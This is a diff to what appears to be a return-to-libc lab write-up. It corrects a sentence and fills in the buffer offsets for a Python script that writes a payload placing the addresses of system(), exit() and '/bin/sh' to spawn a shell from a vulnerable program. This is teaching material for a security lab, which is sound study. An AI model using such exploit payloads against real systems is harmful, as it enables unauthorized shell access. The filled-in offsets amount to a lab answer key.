@@ -47,7 +47,7 @@ void main()
 }
 ```
 
-**Keep the name of executable program with length 6 (=len(`'retlib'`))**
+**Keep the name of the executable program with length 6 (=len(`'retlib'`))**
 
 ```shell
 gcc envaddr.c -o env666
@@ -93,16 +93,16 @@ import sys
 # Fill content with non-zero values
 content = bytearray(0xaa for i in range(300))
 
-X = 0
+X = 32
 sh_addr = 0xbffffdef       # The address of "/bin/sh"
 content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
 
-Y = 0
-system_addr = 0xb7e42da0   # The address of system()
+Y = 24
+system_addr = 0xb7e42da0  # The address of system()
 content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
 
-Z = 0
-exit_addr = 0xb7e369d0     # The address of exit()
+Z = 28
+exit_addr = 0xb7e369d0    # The address of exit()
 content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
 
 # Save content to a file
